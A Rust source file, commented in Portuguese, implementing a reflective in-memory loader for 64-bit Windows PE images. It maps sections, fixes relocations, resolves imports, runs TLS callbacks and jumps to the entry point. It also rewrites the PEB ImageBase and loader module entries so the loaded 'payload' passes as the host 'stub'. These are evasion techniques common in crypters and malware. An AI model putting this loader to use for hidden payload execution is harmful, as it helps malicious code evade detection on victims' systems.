//! Mapper PE64 usado pelo caminho de execução em memória.

#![allow(non_snake_case)]
#![allow(unsafe_op_in_unsafe_fn)]

use core::ffi::c_void;
use core::ptr;

use crate::paging;

#[link(name = "kernel32")]
unsafe extern "system" {
    fn VirtualAlloc(addr: *mut c_void, size: usize, alloc: u32, protect: u32) -> *mut c_void;
    fn VirtualProtect(addr: *mut c_void, size: usize, new: u32, old: *mut u32) -> i32;
    fn VirtualFree(addr: *mut c_void, size: usize, free_type: u32) -> i32;
    fn LoadLibraryA(name: *const u8) -> *mut c_void;
    fn GetProcAddress(module: *mut c_void, name: *const u8) -> *mut c_void;
    fn GetCurrentProcess() -> *mut c_void;
    fn FlushInstructionCache(proc_: *mut c_void, base: *const c_void, size: usize) -> i32;
    fn RtlAddFunctionTable(table: *mut c_void, count: u32, base: u64) -> u8;
    fn AllocConsole() -> i32;
    fn GetConsoleWindow() -> *mut c_void;
    fn ExitProcess(code: u32) -> !;
}

const MEM_COMMIT: u32 = 0x0000_1000;
const MEM_RESERVE: u32 = 0x0000_2000;
const MEM_RELEASE: u32 = 0x0000_8000;

const PAGE_NOACCESS: u32 = 0x01;
const PAGE_READONLY: u32 = 0x02;
const PAGE_READWRITE: u32 = 0x04;
const PAGE_WRITECOPY: u32 = 0x08;
const PAGE_EXECUTE: u32 = 0x10;
const PAGE_EXECUTE_READ: u32 = 0x20;
const PAGE_EXECUTE_READWRITE: u32 = 0x40;
const PAGE_EXECUTE_WRITECOPY: u32 = 0x80;

const SCN_MEM_EXECUTE: u32 = 0x2000_0000;
const SCN_MEM_READ: u32 = 0x4000_0000;
const SCN_MEM_WRITE: u32 = 0x8000_0000;

const DIR_IMPORT: usize = 1;
const DIR_EXCEPTION: usize = 3;
const DIR_BASERELOC: usize = 5;
const DIR_TLS: usize = 9;
const DIR_DELAY_IMPORT: usize = 13;

const REL_ABSOLUTE: u16 = 0;
const REL_DIR64: u16 = 10;

const ORDINAL_FLAG64: u64 = 0x8000_0000_0000_0000;

const SUBSYSTEM_GUI: u16 = 2;
const SUBSYSTEM_CUI: u16 = 3;

const DLL_PROCESS_ATTACH: u32 = 1;

// Limites para tabelas controladas pelo arquivo PE.

const MAX_DLL_NAME: usize = 260;
const MAX_SYM_NAME: usize = 512;
const MAX_IMPORT_DESCRIPTORS: usize = 4096;
const MAX_TLS_CALLBACKS: usize = 256;

#[inline]
fn ru16(b: &[u8], o: usize) -> Option<u16> {
    let s = b.get(o..o.checked_add(2)?)?;
    Some(u16::from_le_bytes([s[0], s[1]]))
}

#[inline]
fn ru32(b: &[u8], o: usize) -> Option<u32> {
    let s = b.get(o..o.checked_add(4)?)?;
    Some(u32::from_le_bytes([s[0], s[1], s[2], s[3]]))
}

#[inline]
fn ru64(b: &[u8], o: usize) -> Option<u64> {
    let s = b.get(o..o.checked_add(8)?)?;
    Some(u64::from_le_bytes([
        s[0], s[1], s[2], s[3], s[4], s[5], s[6], s[7],
    ]))
}

#[derive(Clone, Copy)]
struct Section {
    va: u32,
    vsize: u32,
    raw_ptr: u32,
    raw_size: u32,
    characteristics: u32,
}

struct Pe {
    entry_rva: u32,
    image_base: u64,
    size_of_image: usize,
    size_of_headers: usize,
    subsystem: u16,
    dirs: [(u32, u32); 16],
    sections: [Section; 96],
    n_sections: usize,
}

impl Section {
    #[inline]
    fn span(&self) -> usize {
        self.vsize.max(self.raw_size) as usize
    }
}

impl Pe {
    #[inline]
    fn fits(&self, rva: usize, len: usize) -> bool {
        match rva.checked_add(len) {
            Some(end) => end <= self.size_of_image,
            None => false,
        }
    }

    fn section_of(&self, rva: u32) -> Option<&Section> {
        self.sections[..self.n_sections].iter().find(|s| {
            let span = s.span();
            if span == 0 || rva < s.va {
                return false;
            }
            ((rva - s.va) as usize) < span
        })
    }

    fn is_executable_rva(&self, rva: u32) -> bool {
        self.section_of(rva)
            .map(|s| (s.characteristics & SCN_MEM_EXECUTE) != 0)
            .unwrap_or(false)
    }
}

fn parse(raw: &[u8]) -> Option<Pe> {
    if ru16(raw, 0)? != 0x5A4D {
        return None;
    }
    let pe = ru32(raw, 0x3C)? as usize;
    if ru32(raw, pe)? != 0x0000_4550 {
        return None;
    }
    if ru16(raw, pe + 4)? != 0x8664 {
        return None;
    }

    let n_sections = ru16(raw, pe.checked_add(6)?)? as usize;
    let size_opt = ru16(raw, pe.checked_add(20)?)? as usize;
    let opt = pe.checked_add(24)?;
    let opt_end = opt.checked_add(size_opt)?;

    // O cabeçalho PE32+ precisa alcançar NumberOfRvaAndSizes.

    if size_opt < 112 || opt_end > raw.len() {
        return None;
    }
    if ru16(raw, opt)? != 0x020B {
        return None;
    }
    if n_sections == 0 || n_sections > 96 {
        return None;
    }

    let entry_rva = ru32(raw, opt + 16)?;
    let image_base = ru64(raw, opt + 24)?;
    let size_of_image = ru32(raw, opt + 56)? as usize;
    let size_of_headers = ru32(raw, opt + 60)? as usize;
    let subsystem = ru16(raw, opt + 68)?;
    let n_dirs = ru32(raw, opt + 108)? as usize;

    if size_of_image == 0
        || size_of_image > 512 * 1024 * 1024
        || size_of_headers == 0
        || size_of_headers > raw.len()
        || size_of_headers > size_of_image
        || entry_rva as usize >= size_of_image
    {
        return None;
    }

    let mut dirs = [(0u32, 0u32); 16];
    for (i, d) in dirs.iter_mut().enumerate() {
        if i < n_dirs && i < 16 {
            let o = opt.checked_add(112)?.checked_add(i.checked_mul(8)?)?;
            if o.checked_add(8)? > opt_end {
                return None;
            }
            *d = (ru32(raw, o)?, ru32(raw, o.checked_add(4)?)?);
        }
    }

    let sec_table = opt.checked_add(size_opt)?;
    let mut sections = [Section {
        va: 0,
        vsize: 0,
        raw_ptr: 0,
        raw_size: 0,
        characteristics: 0,
    }; 96];

    for i in 0..n_sections {
        let o = sec_table.checked_add(i.checked_mul(40)?)?;
        let s = Section {
            vsize: ru32(raw, o + 8)?,
            va: ru32(raw, o + 12)?,
            raw_size: ru32(raw, o + 16)?,
            raw_ptr: ru32(raw, o + 20)?,
            characteristics: ru32(raw, o + 36)?,
        };

        // A seção precisa caber tanto na imagem quanto no arquivo.

        let vend = (s.va as usize).checked_add(s.vsize.max(s.raw_size) as usize)?;
        if vend > size_of_image {
            return None;
        }
        if s.raw_size > 0 {
            let rend = (s.raw_ptr as usize).checked_add(s.raw_size as usize)?;
            if rend > raw.len() {
                return None;
            }
        }
        sections[i] = s;
    }

    Some(Pe {
        entry_rva,
        image_base,
        size_of_image,
        size_of_headers,
        subsystem,
        dirs,
        sections,
        n_sections,
    })
}

/// Indica se a imagem depende de armazenamento TLS estático.

pub fn has_static_tls(raw: &[u8]) -> bool {
    let pe = match parse(raw) {
        Some(p) => p,
        None => return false,
    };
    let (rva, size) = pe.dirs[DIR_TLS];
    if rva == 0 || size < 40 {
        return false;
    }
    let off = match rva_to_offset(&pe, rva) {
        Some(o) => o,
        None => return false,
    };
    let start = ru64(raw, off).unwrap_or(0);
    let end = ru64(raw, off + 8).unwrap_or(0);
    let zero = ru32(raw, off + 32).unwrap_or(0);
    end > start || zero > 0
}

fn rva_to_offset(pe: &Pe, rva: u32) -> Option<usize> {
    for s in &pe.sections[..pe.n_sections] {
        let span = s.span();
        if span == 0 || rva < s.va {
            continue;
        }
        let delta = (rva - s.va) as usize;
        if delta >= span || delta >= s.raw_size as usize {
            continue;
        }
        return (s.raw_ptr as usize).checked_add(delta);
    }
    None
}

#[inline]
fn in_image(base: *mut u8, size: usize, addr: usize, len: usize) -> bool {
    let lo = base as usize;
    let hi = match lo.checked_add(size) {
        Some(v) => v,
        None => return false,
    };
    match addr.checked_add(len) {
        Some(end) => addr >= lo && end <= hi,
        None => false,
    }
}

unsafe fn valid_c_string(base: *mut u8, pe: &Pe, rva: usize, max_len: usize) -> bool {
    if rva >= pe.size_of_image {
        return false;
    }
    let remaining = pe.size_of_image - rva;
    let limit = core::cmp::min(remaining, max_len);
    for i in 0..limit {
        if ptr::read(base.add(rva + i)) == 0 {
            return i != 0;
        }
    }
    false
}

pub struct MappedImage {
    base: *mut u8,
    size: usize,
    entry: *mut c_void,
    subsystem: u16,
}

impl MappedImage {
    /// Transfere o controle para a imagem mapeada e não retorna.

    pub unsafe fn run(self) -> ! {
        // Payload de console pode precisar de um console quando o stub é GUI.

        if self.subsystem == SUBSYSTEM_CUI && GetConsoleWindow().is_null() {
            AllocConsole();
        }

        FlushInstructionCache(GetCurrentProcess(), self.base as *const c_void, self.size);

        let entry: extern "system" fn() -> u32 = core::mem::transmute(self.entry);
        let code = entry();
        ExitProcess(code)
    }

    pub fn subsystem(&self) -> u16 {
        self.subsystem
    }
}

/// Libera a região se o mapeamento abortar.

struct Region {
    base: *mut u8,
    armed: bool,
}

impl Drop for Region {
    fn drop(&mut self) {
        if self.armed && !self.base.is_null() {
            unsafe {
                VirtualFree(self.base as *mut c_void, 0, MEM_RELEASE);
            }
        }
    }
}

/// Mapeia uma imagem PE64 completa no processo atual.

pub fn map(raw: &[u8], demand_paging: bool) -> Result<MappedImage, ()> {
    let pe = parse(raw).ok_or(())?;

    unsafe {
        // Tenta o ImageBase original antes de reservar em outro endereço.

        let mut base = VirtualAlloc(
            pe.image_base as *mut c_void,
            pe.size_of_image,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        ) as *mut u8;

        if base.is_null() {
            base = VirtualAlloc(
                ptr::null_mut(),
                pe.size_of_image,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            ) as *mut u8;
        }
        if base.is_null() {
            return Err(());
        }

        let mut region = Region { base, armed: true };

        // Copia cabeçalhos e seções.

        ptr::copy_nonoverlapping(raw.as_ptr(), base, pe.size_of_headers);

        for s in &pe.sections[..pe.n_sections] {
            if s.raw_size == 0 {
                continue; // .bss — VirtualAlloc já entregou zerado
            }
            let mut n = s.raw_size as usize;
            let room = pe.size_of_image - s.va as usize;
            if n > room {
                n = room;
            }
            ptr::copy_nonoverlapping(
                raw.as_ptr().add(s.raw_ptr as usize),
                base.add(s.va as usize),
                n,
            );
        }

        // Aplica relocations quando a base mudou.

        let delta = (base as u64).wrapping_sub(pe.image_base);
        if delta != 0 && !apply_relocs(base, &pe, delta) {
            return Err(());
        }

        // Resolve imports antes das proteções finais das seções.

        if !resolve_imports(base, &pe) {
            return Err(());
        }

        // TLS estático não é suportado por este mapper.

        let tls = match validate_tls(base, &pe) {
            Some(v) => v,
            None => return Err(()),
        };

        // Delay imports são rejeitados em vez de inicializados parcialmente.

        let (delay_rva, delay_size) = pe.dirs[DIR_DELAY_IMPORT];
        if delay_rva != 0 || delay_size != 0 {
            return Err(());
        }

        // Aplica as proteções finais das seções.

        let mut old = 0u32;
        if VirtualProtect(
            base as *mut c_void,
            pe.size_of_headers,
            PAGE_READONLY,
            &mut old,
        ) == 0 {
            return Err(());
        }

        for s in &pe.sections[..pe.n_sections] {
            let size = s.span();
            if size == 0 {
                continue;
            }
            if !pe.fits(s.va as usize, size) {
                return Err(());
            }
            let prot = protection_for(s.characteristics);
            if VirtualProtect(
                base.add(s.va as usize) as *mut c_void,
                size,
                prot,
                &mut old,
            ) == 0 {
                return Err(());
            }
        }

        // Registra os metadados de unwind x64 antes da entrada.

        let (exc_rva, exc_size) = pe.dirs[DIR_EXCEPTION];
        if exc_rva != 0 || exc_size != 0 {
            if exc_rva == 0
                || exc_size < 12
                || (exc_size % 12) != 0
                || !pe.fits(exc_rva as usize, exc_size as usize)
            {
                return Err(());
            }
            let count = exc_size / 12; // sizeof(RUNTIME_FUNCTION) == 12
            if RtlAddFunctionTable(
                base.add(exc_rva as usize) as *mut c_void,
                count,
                base as u64,
            ) == 0 {
                return Err(());
            }
        }

        // Faz GetModuleHandleW(NULL) apontar para a imagem mapeada.

        patch_peb_image_base(base);

        // Executa callbacks TLS já validados.

        if !run_tls_callbacks(base, &pe, &tls) {
            return Err(());
        }

        // A paginação é opcional e é armada por último.

        FlushInstructionCache(
            GetCurrentProcess(),
            base as *const c_void,
            pe.size_of_image,
        );

        if demand_paging {
            let mut ranges: Vec<paging::Range> = Vec::new();

            for s in &pe.sections[..pe.n_sections] {
                let size = s.span();
                if size == 0 || (s.characteristics & SCN_MEM_EXECUTE) == 0 {
                    continue;
                }

                let start = s.va as usize;
                let end = match start
                    .checked_add(size)
                    .and_then(|e| e.checked_add(0xFFF))
                    .map(|e| e & !0xFFF)
                {
                    Some(e) => e.min(pe.size_of_image),
                    None => continue,
                };

                if end <= start {
                    continue;
                }

                ranges.push(paging::Range {
                    rva: start,
                    len: end - start,
                    prot: protection_for(s.characteristics),
                });
            }

            if !ranges.is_empty() {
                // Falha no paging não invalida a imagem já mapeada.

                let _ = paging::arm(base, pe.size_of_image, &ranges);
            }
        }

        region.armed = false; // sucesso: a região é permanente

        Ok(MappedImage {
            base,
            size: pe.size_of_image,
            entry: base.add(pe.entry_rva as usize) as *mut c_void,
            subsystem: pe.subsystem,
        })
    }
}

unsafe fn apply_relocs(base: *mut u8, pe: &Pe, delta: u64) -> bool {
    let (rva, size) = pe.dirs[DIR_BASERELOC];
    if rva == 0 || size == 0 {
        return false;
    }

    let start = rva as usize;
    let end = match start.checked_add(size as usize) {
        Some(v) if v <= pe.size_of_image => v,
        _ => return false,
    };

    let mut cur = start;
    while cur < end {
        // Valida o bloco de relocation antes de lê-lo.

        if end - cur < 8 {
            return false;
        }

        let block = base.add(cur);
        let block_rva = ptr::read_unaligned(block as *const u32) as usize;
        let block_size = ptr::read_unaligned(block.add(4) as *const u32) as usize;

        if block_size < 8 || ((block_size - 8) & 1) != 0 {
            return false;
        }
        let block_end = match cur.checked_add(block_size) {
            Some(v) if v <= end => v,
            _ => return false,
        };

        let count = (block_size - 8) / 2;
        for i in 0..count {
            let entry_off = match cur
                .checked_add(8)
                .and_then(|v| v.checked_add(i.checked_mul(2)?))
            {
                Some(v) if v.checked_add(2).map_or(false, |x| x <= block_end) => v,
                _ => return false,
            };

            let e = ptr::read_unaligned(base.add(entry_off) as *const u16);
            let kind = e >> 12;
            let off = (e & 0x0FFF) as usize;

            match kind {
                REL_ABSOLUTE => {}
                REL_DIR64 => {
                    let target_rva = match block_rva.checked_add(off) {
                        Some(v) => v,
                        None => return false,
                    };
                    if !pe.fits(target_rva, 8) {
                        return false;
                    }
                    let p = base.add(target_rva) as *mut u64;
                    let v = ptr::read_unaligned(p);
                    ptr::write_unaligned(p, v.wrapping_add(delta));
                }
                _ => return false,
            }
        }

        cur = block_end;
    }

    cur == end
}

unsafe fn resolve_imports(base: *mut u8, pe: &Pe) -> bool {
    let (rva, size) = pe.dirs[DIR_IMPORT];
    if rva == 0 || size == 0 {
        return true;
    }

    let dir_start = rva as usize;
    let dir_end = match dir_start.checked_add(size as usize) {
        Some(v) if v <= pe.size_of_image => v,
        _ => return false,
    };

    let mut desc_off = dir_start;
    let mut desc_count = 0usize;

    loop {
        // IMAGE_IMPORT_DESCRIPTOR ocupa 20 bytes.

        if desc_off.checked_add(20).map_or(true, |v| v > dir_end) {
            return false;
        }
        desc_count += 1;
        if desc_count > MAX_IMPORT_DESCRIPTORS {
            return false;
        }

        let desc = base.add(desc_off);
        let orig_thunk = ptr::read_unaligned(desc as *const u32);
        let name_rva = ptr::read_unaligned(desc.add(12) as *const u32);
        let first_thunk = ptr::read_unaligned(desc.add(16) as *const u32);

        if orig_thunk == 0 && name_rva == 0 && first_thunk == 0 {
            break;
        }
        if name_rva == 0 || first_thunk == 0 {
            return false;
        }

        let name = name_rva as usize;
        if !valid_c_string(base, pe, name, MAX_DLL_NAME) {
            return false;
        }

        let dll = LoadLibraryA(base.add(name));
        if dll.is_null() {
            return false;
        }

        let lookup_rva = if orig_thunk != 0 { orig_thunk } else { first_thunk } as usize;
        let iat_rva = first_thunk as usize;
        let mut index = 0usize;

        loop {
            let step = match index.checked_mul(8) {
                Some(v) => v,
                None => return false,
            };
            let lookup_off = match lookup_rva.checked_add(step) {
                Some(v) => v,
                None => return false,
            };
            let iat_off = match iat_rva.checked_add(step) {
                Some(v) => v,
                None => return false,
            };

            if !pe.fits(lookup_off, 8) || !pe.fits(iat_off, 8) {
                return false;
            }

            let entry = ptr::read_unaligned(base.add(lookup_off) as *const u64);
            if entry == 0 {
                break;
            }

            let addr = if (entry & ORDINAL_FLAG64) != 0 {
                GetProcAddress(dll, (entry & 0xFFFF) as usize as *const u8)
            } else {
                let name_rva64 = entry & !ORDINAL_FLAG64;
                if name_rva64 > u32::MAX as u64 {
                    return false;
                }
                let hint_rva = name_rva64 as usize;
                let func_name = match hint_rva.checked_add(2) {
                    Some(v) => v,
                    None => return false,
                };
                if !pe.fits(hint_rva, 2)
                    || !valid_c_string(base, pe, func_name, MAX_SYM_NAME)
                {
                    return false;
                }
                GetProcAddress(dll, base.add(func_name))
            };

            if addr.is_null() {
                return false;
            }

            ptr::write_unaligned(base.add(iat_off) as *mut u64, addr as u64);
            index += 1;

            if index > pe.size_of_image / 8 {
                return false;
            }
        }

        desc_off = match desc_off.checked_add(20) {
            Some(v) => v,
            None => return false,
        };
    }

    true
}

// Delay imports usam fail-closed.

fn protection_for(ch: u32) -> u32 {
    let x = ch & SCN_MEM_EXECUTE != 0;
    let r = ch & SCN_MEM_READ != 0;
    let w = ch & SCN_MEM_WRITE != 0;

    match (x, r, w) {
        (true, true, true) => PAGE_EXECUTE_READWRITE,
        (true, true, false) => PAGE_EXECUTE_READ,
        (true, false, true) => PAGE_EXECUTE_WRITECOPY,
        (true, false, false) => PAGE_EXECUTE,
        (false, true, true) => PAGE_READWRITE,
        (false, true, false) => PAGE_READONLY,
        (false, false, true) => PAGE_WRITECOPY,
        (false, false, false) => PAGE_NOACCESS,
    }
}

#[cfg(target_arch = "x86_64")]
#[inline(always)]
unsafe fn peb() -> *mut u8 {
    let p: *mut u8;
    core::arch::asm!("mov {}, gs:[0x60]", out(reg) p, options(nostack, preserves_flags));
    p
}

const PEB_IMAGE_BASE: usize = 0x10;
const PEB_LDR: usize = 0x18;

unsafe fn patch_peb_image_base(base: *mut u8) {
    let p = peb();
    if !p.is_null() {
        ptr::write_unaligned(p.add(PEB_IMAGE_BASE) as *mut *mut u8, base);
    }
}

/// Atualiza opcionalmente a entrada principal do LDR para payloads que consultam a lista de módulos.

#[allow(dead_code)]
pub unsafe fn patch_ldr_entry(base: *mut u8, entry: *mut u8, size_of_image: u32) {
    let p = peb();
    if p.is_null() {
        return;
    }
    let ldr = ptr::read_unaligned(p.add(PEB_LDR) as *const *mut u8);
    if ldr.is_null() {
        return;
    }
    let first = ptr::read_unaligned(ldr.add(0x10) as *const *mut u8);
    if first.is_null() {
        return;
    }
    ptr::write_unaligned(first.add(0x30) as *mut *mut u8, base); // DllBase
    ptr::write_unaligned(first.add(0x38) as *mut *mut u8, entry); // EntryPoint
    ptr::write_unaligned(first.add(0x40) as *mut u32, size_of_image); // SizeOfImage
}

#[derive(Clone, Copy)]
struct TlsCallbacks {
    array_va: usize,
    count: usize,
}

unsafe fn validate_tls(base: *mut u8, pe: &Pe) -> Option<TlsCallbacks> {
    let (rva, size) = pe.dirs[DIR_TLS];
    if rva == 0 && size == 0 {
        return Some(TlsCallbacks { array_va: 0, count: 0 });
    }
    if rva == 0 || size < 40 || !pe.fits(rva as usize, 40) {
        return None;
    }

    let dir = base.add(rva as usize);
    let start_va = ptr::read_unaligned(dir as *const u64) as usize;
    let end_va = ptr::read_unaligned(dir.add(8) as *const u64) as usize;
    let index_va = ptr::read_unaligned(dir.add(16) as *const u64) as usize;
    let callbacks_va = ptr::read_unaligned(dir.add(24) as *const u64) as usize;
    let zero_fill = ptr::read_unaligned(dir.add(32) as *const u32) as usize;

    if end_va > start_va || zero_fill != 0 {
        return None;
    }

    // AddressOfIndex, quando presente, precisa apontar para a própria imagem.

    if index_va != 0 && !in_image(base, pe.size_of_image, index_va, 4) {
        return None;
    }

    if callbacks_va == 0 {
        if index_va != 0 {
            ptr::write_unaligned(index_va as *mut u32, 0);
        }
        return Some(TlsCallbacks { array_va: 0, count: 0 });
    }

    if !in_image(base, pe.size_of_image, callbacks_va, 8) {
        return None;
    }

    let base_addr = base as usize;
    let mut count = 0usize;

    loop {
        if count >= MAX_TLS_CALLBACKS {
            return None;
        }

        let elem = callbacks_va.checked_add(count.checked_mul(8)?)?;
        if !in_image(base, pe.size_of_image, elem, 8) {
            return None;
        }

        let cb_va = ptr::read_unaligned(elem as *const u64) as usize;
        if cb_va == 0 {
            break;
        }

        if !in_image(base, pe.size_of_image, cb_va, 1) {
            return None;
        }
        let cb_rva = cb_va.checked_sub(base_addr)?;
        if cb_rva > u32::MAX as usize || !pe.is_executable_rva(cb_rva as u32) {
            return None;
        }

        count += 1;
    }

    if index_va != 0 {
        ptr::write_unaligned(index_va as *mut u32, 0);
    }

    Some(TlsCallbacks { array_va: callbacks_va, count })
}

unsafe fn run_tls_callbacks(base: *mut u8, pe: &Pe, tls: &TlsCallbacks) -> bool {
    if tls.array_va == 0 || tls.count == 0 {
        return true;
    }

    let base_addr = base as usize;

    for i in 0..tls.count {
        // Um callback anterior pode ter alterado a própria tabela.

        let elem = match tls.array_va.checked_add(i.saturating_mul(8)) {
            Some(v) => v,
            None => return false,
        };
        if !in_image(base, pe.size_of_image, elem, 8) {
            return false;
        }

        let cb_va = ptr::read_unaligned(elem as *const u64) as usize;
        if cb_va == 0 || !in_image(base, pe.size_of_image, cb_va, 1) {
            return false;
        }

        let cb_rva = match cb_va.checked_sub(base_addr) {
            Some(v) if v <= u32::MAX as usize => v as u32,
            _ => return false,
        };
        if !pe.is_executable_rva(cb_rva) {
            return false;
        }

        let f: unsafe extern "system" fn(*mut c_void, u32, *mut c_void) =
            core::mem::transmute(cb_va);
        f(base as *mut c_void, DLL_PROCESS_ATTACH, ptr::null_mut());
    }

    true
}
